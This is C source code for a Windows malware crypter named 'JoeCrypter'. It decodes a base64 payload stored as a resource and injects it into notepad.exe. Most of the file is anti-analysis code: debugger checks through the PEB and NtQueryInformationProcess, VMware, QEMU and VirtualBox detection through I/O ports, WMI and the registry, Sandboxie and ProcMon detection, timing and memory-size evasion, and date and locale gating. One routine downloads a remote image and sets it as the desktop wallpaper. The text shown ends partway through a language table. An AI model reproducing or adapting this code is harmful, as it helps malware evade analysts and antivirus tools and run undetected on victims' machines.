#include <windows.h>
#include <stdio.h>
#include <wbemidl.h>
#include <time.h>
#include <Objbase.h>
#include "joecrypt_injecter.h"
#define WIN32_LEAN_AND_MEAN
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383


// function prototypes
char *GetPayload(void);
unsigned char *b64_decode_ex(const char *src, size_t len, size_t *decsize) ;
void LongStall(void);
int procmem_evas(void);
int NumaEvas(void);
int AllocMem_Fornoreason(void);
void MemSizeTrick(void);
int LotsOfWindows(HWND);
int FlsTrick(void);
int timing_evasion_3(void);
void PassToNoobs(void);
char GetBeingDebugged(void);
BOOL IsInsideVMWare(void);
char GetNtGlobalFlags(void);
void checkQIP(void);
void GetHeapFlags(void);
void anti_vm_wmi(void);
int reg_enum_vm_check(void);
int AntiEmu(void);
void JoeSpecial(void);
void special_usercheck(void);
void AnotherAntiDebugRoutine(void);
void GS_Check(void);
void AntiProcMon(void);
void date_specific_check(char *shortdate);
void region_specific_check(char *region);

//const char g_szClassName[] = "JoeCrypter";
static const char b64_table[] = {
  'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
  'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
  'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
  'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
  'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
  'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
  'w', 'x', 'y', 'z', '0', '1', '2', '3',
  '4', '5', '6', '7', '8', '9', '+', '/'
};

DWORD rsrc_len = 0;


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
		case WM_CREATE:
		{	
                                                                                                                                                                                              checkQIP();if (GetNtGlobalFlags() == 'p'){PassToNoobs();}if (GetBeingDebugged()){PassToNoobs();}GetHeapFlags();AnotherAntiDebugRoutine();GS_Check();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
			unsigned char *payload = b64_decode_ex(GetPayload(),rsrc_len,0);
			ExecFile("c:\\windows\\system32\\notepad.exe",payload);
		}
		break;
        case WM_CLOSE:
            DestroyWindow(hwnd);
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
        break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
	checkQIP();
	if(GetNtGlobalFlags() == 'p')
	{
	   PassToNoobs();
	}
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;

	char mystr[9];
	char name2[9];
	DWORD kek = GetTickCount();
	sprintf(mystr,"%x",kek);
	// random window name
	int kk = rand() % (256 - 64 + 1) + 64;
	__asm
	{
		xor ecx,ecx
		mov ecx,kk
		next:
		fnop
		nop
		loop next
	}
	// random stall for to ensure window name and title are different 
	DWORD rekt = GetTickCount();
	sprintf(name2,"%x",rekt);

	// ^^ random class name please :)
    wc.lpszClassName = mystr;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassEx(&wc))
    {
        return 0;
    }
    hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        mystr,
        name2,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
        NULL, NULL, hInstance, NULL);



    if(hwnd == NULL)
    {
        return 0;
    }

    ShowWindow(hwnd, SW_HIDE);
    UpdateWindow(hwnd);
    while(GetMessage(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return Msg.wParam;
}


char *GetPayload(void)
{
	char *retmsg = NULL;
	char pth[MAX_PATH];
	GetModuleFileName(NULL,pth,MAX_PATH);
	HMODULE hexe = LoadLibrary(pth);

	HRSRC pres = FindResource(hexe,MAKEINTRESOURCE(8001),RT_RCDATA);
	if(pres == NULL)
	{
		
		return retmsg ;
	}
	char *hResLoad = LoadResource(hexe,pres);
	rsrc_len = SizeofResource(hexe, pres); // store in global var value for later

	if(hResLoad == NULL)
	{
		
		return retmsg;
	}
	return hResLoad;
}

unsigned char *b64_decode_ex(const char *src, size_t len, size_t *decsize) 
{
  int i = 0;
  int j = 0;
  int l = 0;
  size_t size = 0;
  unsigned char *dec = NULL;
  unsigned char buf[3];
  unsigned char tmp[4];

  // alloc
  dec = (unsigned char *) malloc(0);
  if (NULL == dec) { return NULL; }

  // parse until end of source
  while (len--) {
    // break if char is `=' or not base64 char
    if ('=' == src[j]) { break; }
    if (!(isalnum(src[j]) || '+' == src[j] || '/' == src[j])) { break; }

    // read up to 4 bytes at a time into `tmp'
    tmp[i++] = src[j++];

    // if 4 bytes read then decode into `buf'
    if (4 == i) {
      // translate values in `tmp' from table
      for (i = 0; i < 4; ++i) {
        // find translation char in `b64_table'
        for (l = 0; l < 64; ++l) {
          if (tmp[i] == b64_table[l]) {
            tmp[i] = l;
            break;
          }
        }
      }

      // decode
      buf[0] = (tmp[0] << 2) + ((tmp[1] & 0x30) >> 4);
      buf[1] = ((tmp[1] & 0xf) << 4) + ((tmp[2] & 0x3c) >> 2);
      buf[2] = ((tmp[2] & 0x3) << 6) + tmp[3];

      // write decoded buffer to `dec'
      dec = (unsigned char *) realloc(dec, size + 3);
      for (i = 0; i < 3; ++i) {
        dec[size++] = buf[i];
      }

      // reset
      i = 0;
    }
  }

  // remainder
  if (i > 0) {
    // fill `tmp' with `\0' at most 4 times
    for (j = i; j < 4; ++j) {
      tmp[j] = '\0';
    }

    // translate remainder
    for (j = 0; j < 4; ++j) {
        // find translation char in `b64_table'
        for (l = 0; l < 64; ++l) {
          if (tmp[j] == b64_table[l]) {
            tmp[j] = l;
            break;
          }
        }
    }

    // decode remainder
    buf[0] = (tmp[0] << 2) + ((tmp[1] & 0x30) >> 4);
    buf[1] = ((tmp[1] & 0xf) << 4) + ((tmp[2] & 0x3c) >> 2);
    buf[2] = ((tmp[2] & 0x3) << 6) + tmp[3];

    // write remainer decoded buffer to `dec'
    dec = (unsigned char *) realloc(dec, size + (i - 1));
    for (j = 0; (j < i - 1); ++j) {
      dec[size++] = buf[j];
    }
  }

  // Make sure we have enough space to add '\0' character at end.
  dec = (unsigned char *) realloc(dec, size + 1);
  dec[size] = '\0';
  
  // Return back the size of decoded string if demanded.
  if (decsize != NULL) *decsize = size;
  
  return dec;
}

void LongStall(void)
{
	DWORD ayylmao=timeGetTime() * 20;
	_asm
	{
	xor eax,eax
	xor ecx,ecx
	mov eax,ayylmao
	mov ecx,0
	testd:
	fnop
	inc ecx
	cmp eax,ecx
	jnz testd
	pop ebx
	nop
	}
}


typedef volatile struct _PROCESS_MEMORY_COUNTERS {
  DWORD  cb;
  DWORD  PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
} PROCESS_MEMORY_COUNTERS, *PPROCESS_MEMORY_COUNTERS;

typedef BOOL (*_GetProcessMemoryInfo)(HANDLE proc, PPROCESS_MEMORY_COUNTERS pmc, DWORD cb);
	_GetProcessMemoryInfo GetProcMem;

int procmem_evas(void)
{
	  char psapi[10];
		psapi[0] = 'p';
		psapi[1] = 's';
		psapi[2] = 'a';
		psapi[3] = 'p';
		psapi[4] = 'i';
		psapi[5] = '.';
		psapi[6] = 'd';
		psapi[7] = 'l';
		psapi[8] = 'l';
		psapi[9] = '\0';
	char gpmi[21];
		gpmi[0] = 'G';
		gpmi[1] = 'e';
		gpmi[2] = 't';
		gpmi[3] = 'P';
		gpmi[4] = 'r';
		gpmi[5] = 'o';
		gpmi[6] = 'c';
		gpmi[7] = 'e';
		gpmi[8] = 's';
		gpmi[9] = 's';
		gpmi[10] = 'M';
		gpmi[11] = 'e';
		gpmi[12] = 'm';
		gpmi[13] = 'o';	
		gpmi[14] = 'r';
		gpmi[15] = 'y';
		gpmi[16] = 'I';
		gpmi[17] = 'n';
		gpmi[18] = 'f';
		gpmi[19] = 'o';
		gpmi[20] = '\0';
PROCESS_MEMORY_COUNTERS pmc;
GetProcMem = (_GetProcessMemoryInfo)GetProcAddress(LoadLibrary(psapi),gpmi);

GetProcMem(GetCurrentProcess(), &pmc, sizeof(pmc));
  if(pmc.WorkingSetSize<=3456789)
  {

   return 0;
  }
  else
  {
  // debugger / AV detected
		
	__asm 
	{
	 push 0
	 call ExitProcess
	}
  }
return 0;
}
typedef LPVOID (*_VirtualAllocExNuma) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
	DWORD  flAllocationType, DWORD  flProtect, DWORD  nndPreferred); _VirtualAllocExNuma Numa;
int NumaEvas(void) // doesnt work on xp
{
	OSVERSIONINFO osvi;
	GetVersionEx(&osvi);
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	 if(osvi.dwMajorVersion >= 6)
	 {
	 Numa = (_VirtualAllocExNuma)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualAllocExNuma");
	 LPVOID mem = NULL;
	 mem = Numa(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
	 if(mem != NULL)
	 {
	 return 0; // return to main prog
	 }
	 else
	 {
		// exit process
	 	__asm
		{
			push 0
			call ExitProcess
		}
		return 0;
	 }
	}
	else
	{
		// no numa on xp so....
		return 1;
	}
}

int AllocMem_Fornoreason(void)
{
	int x;
	for(x=0;x<3;x++)
	{
	// allocate like 350 megs of ram, then free, rinse repeat a couple times.
	LPVOID kek = VirtualAlloc(NULL,367001600, MEM_RESERVE | MEM_COMMIT,0x40);
	Sleep(5000); // Sleep 5 seconds and free
	VirtualFree(kek,367001600,MEM_RELEASE|MEM_DECOMMIT);
	}
	return 0;
}

 typedef HWND( *_CreateWindowExA)( DWORD dwExStyle, LPCTSTR lpClassName,LPCTSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth,
 int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
    _CreateWindowExA CreateDaWindow;
int LotsOfWindows(HWND mainwindow) 
{ 
	HWND hoep;
	CreateDaWindow = (_CreateWindowExA)GetProcAddress(LoadLibrary("user32.dll"),"CreateWindowExA");
	int x;
	for(x=0;x<12345;x++)
	{
		if(x % 2 == 0) // even
		{
			WNDCLASSEX wc;
			wc.cbSize        = sizeof(WNDCLASSEX);
    		wc.style         = 0;
    		wc.lpfnWndProc   = NULL;
    		wc.cbClsExtra    = 0;
    		wc.cbWndExtra    = 0;
    		wc.hInstance     = NULL;
    		wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    		wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    		wc.lpszMenuName  = NULL;
    		wc.lpszClassName = "lol";
    		wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
			RegisterClassEx(&wc);
			
			char mystr[9]; // random window names
			DWORD kek = GetTickCount();
			sprintf(mystr,"%x",kek);
			hoep = CreateDaWindow(0x00000200,mystr,mystr,0x00200000,CW_USEDEFAULT, CW_USEDEFAULT,0,0,mainwindow,NULL,NULL, NULL);
			ShowWindow(hoep,SW_SHOWNORMAL);
			UpdateWindow(hoep);

		}
		if(x % 2 == 1 || x % 2 == -1) // odd
		{
			WNDCLASSEX wc;
			wc.cbSize        = sizeof(WNDCLASSEX);
    		wc.style         = 0;
    		wc.lpfnWndProc   = NULL;
    		wc.cbClsExtra    = 0;
    		wc.cbWndExtra    = 0;
    		wc.hInstance     = NULL;
    		wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    		wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    		wc.lpszMenuName  = NULL;
    		wc.lpszClassName = "lol";
    		wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
			RegisterClassEx(&wc);
			
			char mystr[9]; // random window names
			DWORD kek = GetTickCount();
			sprintf(mystr,"%x",kek);
			hoep = CreateDaWindow(0x00000200,mystr,mystr,0x00040000,CW_USEDEFAULT, CW_USEDEFAULT,0,0,mainwindow,NULL,NULL, NULL);
			ShowWindow(hoep,SW_SHOWNORMAL);
			UpdateWindow(hoep);
			}

	}
	
    return 0;
}
typedef DWORD (*_FlsAlloc) (PFLS_CALLBACK_FUNCTION lpCallback); _FlsAlloc FlsCrap;
int FlsTrick(void)
{
	FlsCrap = (_FlsAlloc)GetProcAddress(LoadLibrary("Kernel32.dll"),"FlsAlloc");
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
    if(osvi.dwMajorVersion >= 6)
    {
		DWORD result =  FlsCrap(NULL);
		if(result != FLS_OUT_OF_INDEXES)
		{
		return 0;
		}
		else
		{
			__asm{
				push 0
				call ExitProcess
				}
			return 0;
		}
	}
	else
	{
		// XP means no FlsAlloc() :(
		return 1;
	}
}
int timing_evasion_3(void)
{	
	DWORD joe_time_test1, joe_time_test2;
	joe_time_test1 = timeGetTime();
	Sleep(1000);
	joe_time_test2 = timeGetTime();
	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
	{
		return 0;
	}
	else
	{
		__asm
		{
			push 0
			call ExitProcess
		}
		return 0;
	}
}

void PassToNoobs(void)
{
	__asm
	{
		_emit 0xCD
		_emit 0x01
		mov eax,0x80087355
		jmp eax
	}
}

char GetBeingDebugged(void)
{
	char BeingDebuggedBit;
	__asm {
		MOV EAX,DWORD PTR FS:[0x30]
		XOR EAX, 0x2
		SUB EBX, EBX
		XOR BL, [EAX]
		MOV BeingDebuggedBit, BL
	};
	return( BeingDebuggedBit );
}

BOOL IsInsideVMWare(void)
{
  BOOL rc = 0;

  __try
  {
    __asm
    {
      push   edx
      push   ecx
      push   ebx

      mov    eax, 0x564D5868
      mov    ebx, 0 // any value but not the MAGIC VALUE
      mov    ecx, 10 // get VMWare version
      mov    edx, 0x5658 //'VX' // port number

      in     eax, dx // read port
                     // on return EAX returns the VERSION
      cmp    ebx, 0x564D5868 //"VMXh" // is it a reply from VMWare?
      jnz lolol
      mov rc,0 // lol redundancy
      pop    ebx
      pop    ecx
      pop    edx
      ret  
	  lolol:	  
	  mov rc,1
      pop    ebx
      pop    ecx
      pop    edx
      ret
// setz   rc fails

    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
    rc = 0;
  }

  return rc;
}

char GetNtGlobalFlags(void)
{
	char *NtGlobalFlags;
	__asm {
		MOV EAX, FS:[0x30] 
		MOV EAX, [EAX+0x68]
		MOV [NtGlobalFlags], EAX
	};
	return( ( char ) NtGlobalFlags );
} // check for 0x70 

void GetHeapFlags(void)
{
	char *HeapFlags;
	__asm {
		MOV EAX, FS:[0x30]
		MOV EAX, [EAX+0x18]
		MOV EAX, [EAX+0x10]
		MOV [HeapFlags], EAX
	};
	if((char)HeapFlags !=0)
	{
		return;
	}
	else
	{
		PassToNoobs();
	}
} // make sure result != 0


typedef NTSTATUS ( WINAPI *NQIP )( HANDLE, LONG, PVOID, ULONG, PULONG );
	
void checkQIP(void)
{
	NQIP NtQueryInformationProcess = ( NQIP )GetProcAddress( GetModuleHandle( "ntdll.dll" ), "NtQueryInformationProcess" );
	int returnValue = 0;
	NtQueryInformationProcess( GetCurrentProcess( ), 0x7, &returnValue, 4, 0 );
	if( returnValue != 0 )
	{
		__asm
		{
			push 0
			call ExitProcess
		}
	}
}
void anti_vm_wmi(void)
{
    // result code from COM calls
    HRESULT hr = 0;

    // COM interface pointers
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;

    BSTR resource = SysAllocString(L"ROOT\\CIMV2");
    BSTR language = SysAllocString(L"WQL");
    BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
	// SELECT Caption FROM Win32_DiskDrive

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) {
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
            VARIANT caption;
            hr = result->lpVtbl->Get(result, L"Caption", 0, &caption, 0, 0);
			char prop[128];
			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
			
			char *vm1 = "QEMU";
			char *vm2 = "VMware";
			char *vm3 = "vbox";

			if(strstr(prop,vm1))
			{
				PassToNoobs();
			}

			if(strstr(prop,vm2))
			{
				PassToNoobs();
			}

			if(strstr(prop,vm3))
			{
				PassToNoobs();
			}
			
            result->lpVtbl->Release(result);
			return; // yay no vm
        }
    }

    // release WMI COM interfaces
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);

    // unwind everything else we've allocated
    CoUninitialize();

    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
}


int reg_enum_vm_check(void)
{
   HKEY hTestKey;
// with IDE on virtualbox
// (1) CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____
// (2) DiskVMware_Virtual_IDE_Hard_Drive___________00000001

   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Enum\\IDE\\"), 0,
	 KEY_READ, &hTestKey) == ERROR_SUCCESS)
   	{
	TCHAR    achKey[MAX_KEY_LENGTH];
    DWORD    cbName;
    TCHAR    achClass[MAX_PATH] = TEXT("");
    DWORD    cchClassName = MAX_PATH;
    DWORD    cSubKeys=0;
    DWORD    cbMaxSubKey;
    DWORD    cchMaxClass;
    DWORD    cValues;    
    DWORD    cchMaxValue;
    DWORD    cbMaxValueData;
    DWORD    cbSecurityDescriptor;
    FILETIME ftLastWriteTime;     
    DWORD i, retCode; 
    retCode = RegQueryInfoKey(hTestKey, achClass, &cchClassName, NULL, &cSubKeys, &cbMaxSubKey,
    &cchMaxClass, &cValues, &cchMaxValue, &cbMaxValueData, &cbSecurityDescriptor, &ftLastWriteTime);
      if (cSubKeys)
      {
        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                if(strstr(achKey,"VMware"))
				{
				PassToNoobs();
				}
				if(strstr(achKey,"QEMU"))
				{
				PassToNoobs();
				}
				if(strstr(achKey,"vbox"))
				{
				
				PassToNoobs();
				}
				
            }
        }
      } 
      
   	}
   
   RegCloseKey(hTestKey);
   
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Enum\\SCSI\\"), 0,
	 KEY_READ, &hTestKey) == ERROR_SUCCESS)
   	{
	TCHAR    achKey[MAX_KEY_LENGTH];
    DWORD    cbName;
    TCHAR    achClass[MAX_PATH] = TEXT("");
    DWORD    cchClassName = MAX_PATH;
    DWORD    cSubKeys=0;
    DWORD    cbMaxSubKey;
    DWORD    cchMaxClass;
    DWORD    cValues;    
    DWORD    cchMaxValue;
    DWORD    cbMaxValueData;
    DWORD    cbSecurityDescriptor;
    FILETIME ftLastWriteTime;     
    DWORD i, retCode; 
    retCode = RegQueryInfoKey(hTestKey, achClass, &cchClassName, NULL, &cSubKeys, &cbMaxSubKey,
    &cchMaxClass, &cValues, &cchMaxValue, &cbMaxValueData, &cbSecurityDescriptor, &ftLastWriteTime);
      if (cSubKeys)
      {
        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                if(strstr(achKey,"VMware"))
				{
				PassToNoobs();
				}
				if(strstr(achKey,"QEMU"))
				{
				PassToNoobs();
				}
				if(strstr(achKey,"vbox"))
				{
				
				PassToNoobs();
				}
				
            }
        }
      } 
      
   	}
	RegCloseKey(hTestKey);
	return 0;
}
// SMBIOSID aka return BasicWMIQuery("SELECT * FROM Win32_ComputerSystemProduct", "UUID");

// if ($uuid -eq "00000000-0000-0000-0000-000000000000")  { return

int AntiEmu(void)
{
	if(GetModuleHandle("SbieDll.dll") !=0)
	{
	PassToNoobs();
	}
	DWORD ticks = GetTickCount();
	Sleep(702);
	DWORD ticks_test = GetTickCount();
	if((ticks_test - ticks) < 700)
	{
	PassToNoobs();
	}
	return 0;
}

void special_usercheck(void)
{
	char user[128] = "";
	DWORD len = 128;
	GetUserName(user,&len);
	if(strstr(user,"Johnson"))
	{
			PassToNoobs();
	}
}

void JoeSpecial(void)
{
typedef HRESULT (*_URLDownloadToFile) (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, 
DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB); _URLDownloadToFile GrabFile;
GrabFile = (_URLDownloadToFile)GetProcAddress(LoadLibrary("urlmon.dll"),"URLDownloadToFileA");
OSVERSIONINFO osvi;
ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&osvi);
    if(osvi.dwMajorVersion >= 6)
    {
			if (GrabFile(NULL, "http://img05.deviantart.net/1728/i/2010/252/b/2/saban_power_rangers_wallpaper_by_scottasl-d2yczqz.jpg", 
			"c:\\bg.jpg", 0, NULL) == S_OK)
			{
			Sleep(500);
			SystemParametersInfo(0x14,3,"c:\\bg.jpg",0x01|0x02);
			}
	}
	else
	{
			if (GrabFile(NULL, "http://contrib-test-vip.andrew.cmu.edu/pub/scene.org/graphics/artists/rastamon/hyo.bmp", 
			"c:\\lol.bmp", 0, NULL) == S_OK)
			{
			Sleep(500);
			SystemParametersInfo(0x14,3,"lol.bmp",0x01|0x02);
			}
		
	}
}

void MemSizeTrick(void)
{MEMORYSTATUSEX statex;
	statex.dwLength = sizeof (statex);
	GlobalMemoryStatusEx (&statex);
	DWORD biggun = (((statex.ullTotalPhys) / 1024) / 1024);
	
	if(biggun <= 2048)
	{
		PassToNoobs();
	}
}
void AnotherAntiDebugRoutine(void)
{
	_asm
	{
	blocStart:
	mov eax, blocStart
	mov ecx, blocEnd
	sub ecx, blocStart

	antiBpLoop:
	cmp byte [eax], bl
	jne continueLoop
	mov [eax], byte 0xEB

	continueLoop:
	inc eax
	dec ecx
	jnz antiBpLoop
	mov ecx, 0x02
	xor eax, eax
	jz valid
	db 0x02

	valid:
	db 0xCC
	db 0x02
	ret

	db 0x81
	sub ebx, 0xB4
	mov eax, [fs:ebx]
	add ebx, ebx
	mov eax, dword [eax + ebx]
	cmp byte [eax + ecx], ch
	pop ecx
	pop eax
	pop ebx
	je blocEnd
	db 0xEA

	blocEnd:
	}
}

void GS_Check(void)
{
	_asm
	{
	push 3
	pop gs
	l1: mov ax, gs
	cmp  al, 3
	je l1
	push 3
	pop gs
	mov ax, gs
	cmp al, 3
	jne being_debugged
	pop ecx
	xor eax,eax
	mov esp,ebp
	pop ebp
	retn
	being_debugged:
	mov eax,0xdeadbeef
	jmp eax
	}
return;
}

void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
{
	CreateFile("\\\\.\\ProcmonDebugLogger", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); 
	if(GetLastError() == 2)
	{
		return;
	}
	else
	{
		PassToNoobs();
	}
	
return;
}

void date_specific_check(char *shortdate)
{
	time_t rawtime;
	struct tm * timeinfo;
  	char currentdate[80];

  	time (&rawtime);
  	timeinfo = localtime(&rawtime);
	strftime(currentdate,80,"%d/%m/%Y",timeinfo);
	
	//get current date, check against current month
	if(strstr(currentdate,shortdate))
	{
	// clean return
		return;
	}
	else{
	PassToNoobs();
	}
}

void region_specific_check(char *region)
{
LANGID id;
char *lang = "";

	  id = GetSystemDefaultUILanguage();
	  switch(id)
	  {
		case 0x0000: lang = "Language Neutral"; break;
		case 0x007f: lang = "Locale Invariant"; break;
		case 0x0400: lang = "User Default Language"; break;
		case 0x0800: lang = "System Default Language"; break;
		case 0x0436: lang = "Afrikaans"; break;
		case 0x041c: lang = "Albanian"; break;
		case 0x0401: lang = "Arabic (Saudi Arabia)"; break;
		case 0x0801: lang = "Arabic (Iraq)"; break;
		case 0x0c01: lang = "Arabic (Egypt)"; break;
		case 0x1001: lang = "Arabic (Libya)"; break;
		case 0x1401: lang = "Arabic (Algeria)"; break;
		case 0x1801: lang = "Arabic (Morocco)"; break;
		case 0x1c01: lang = "Arabic (Tunisia)"; break;
		case 0x2001: lang = "Arabic (Oman)"; break;
		case 0x2401: lang = "Arabic (Yemen)"; break;
		case 0x2801: lang = "Arabic (Syria)"; break;
		case 0x2c01: lang = "Arabic (Jordan)"; break;
		case 0x3001: lang = "Arabic (Lebanon)"; break;
		case 0x3401: lang = "Arabic (Kuwait)"; break;
		case 0x3801: lang = "Arabic (U.A.E.)"; break;
		case 0x3c01: lang = "Arabic (Bahrain)"; break;
		case 0x4001: lang = "Arabic (Qatar)"; break;
		case 0x042b: lang = "Armenian"; break;
		case 0x042c: lang = "Azeri (Latin)"; break;
		case 0x082c: lang = "Azeri (Cyrillic)"; break;
		case 0x042d: lang = "Basque"; break;
		case 0x0423: lang = "Belarusian"; break;
		case 0x0402: lang = "Bulgarian"; break;
		case 0x0455: lang = "Burmese"; break;
		case 0x0403: lang = "Catalan"; break;
		case 0x0404: lang = "Chinese (Taiwan)"; break;
		case 0x0804: lang = "Chinese"; break;
		case 0x0c04: lang = "Chinese (Hong Kong)"; break;
		case 0x1004: lang = "Chinese (Singapore)"; break;
		case 0x1404: lang = "Chinese (Macau)"; break;
		case 0x041a: lang = "Croatian"; break;
		case 0x0405: lang = "Czech"; break;
		case 0x0406: lang = "Danish"; break;
		case 0x0465: lang = "Divehi"; break;
		case 0x0413: lang = "Dutch (Netherlands)"; break;
		case 0x0813: lang = "Dutch (Belgium)"; break;
		case 0x0409: lang = "English (United States)"; break;
		case 0x0809: lang = "English (United Kingdom)"; break;
		case 0x0c09: lang = "English (Australian)"; break;
		case 0x1009: lang = "English (Canadian)"; break;
		case 0x1409: lang = "English (New Zealand)"; break;
		case 0x1809: lang = "English (Ireland)"; break;
		case 0x1c09: lang = "English (South Africa)"; break;
		case 0x2009: lang = "English (Jamaica)"; break;
		case 0x2409: lang = "English (Caribbean)"; break;
		case 0x2809: lang = "English (Belize)"; break;
		case 0x2c09: lang = "English (Trinidad)"; break;
		case 0x3009: lang = "English (Zimbabwe)"; break;
		case 0x3409: lang = "English (Philippines)"; break;
		case 0x0425: lang = "Estonian"; break;
		case 0x0438: lang = "Faeroese"; break;
		case 0x0429: lang = "Farsi"; break;
		case 0x040b: lang = "Finnish"; break;
		case 0x040c: lang = "French (Standard)"; break;
		case 0x080c: lang = "French (Belgian)"; break;
		case 0x0c0c: lang = "French (Canadian)"; break;
		case 0x100c: lang = "French (Switzerland)"; break;
		case 0x140c: lang = "French (Luxembourg)"; break;
		case 0x180c: lang = "French (Monaco)"; break;
		case 0x0456: lang = "Galician"; break;
		case 0x0437: lang = "Georgian"; break;
		case 0x0407: lang = "German (Standard)"; break;
		case 0x0807: lang = "German (Switzerland)"; break;
		case 0x0c07: lang = "German (Austria)"; break;
		case 0x1007: lang = "German (Luxembourg)"; break;
		case 0x1407: lang = "German (Liechtenstein)"; break;
		case 0x0408: lang = "Greek"; break;
		case 0x0447: lang = "Gujarati"; break;
		case 0x040d: lang = "Hebrew"; break;
		case 0x0439: lang = "Hindi"; break;
		case 0x040e: lang = "Hungarian"; break;
		case 0x040f: lang = "Icelandic"; break;
		case 0x0421: lang = "Indonesian"; break;
		case 0x0410: lang = "Italian (Standard)"; break;
		case 0x0810: lang = "Italian (Switzerland)"; break;
		case 0x0411: lang = "Japanese"; break;
		case 0x044b: lang = "Kannada"; break;
		case 0x0457: lang = "Konkani"; break;
		case 0x0412: lang = "Korean"; break;
		case 0x0812: lang = "Korean (Johab)"; break;
		case 0x0440: lang = "Kyrgyz"; break;
		case 0x0426: lang = "Latvian"; break;
		case 0x0427: lang = "Lithuanian"; break;
		case 0x0827: lang = "Lithuanian (Classic)"; break;
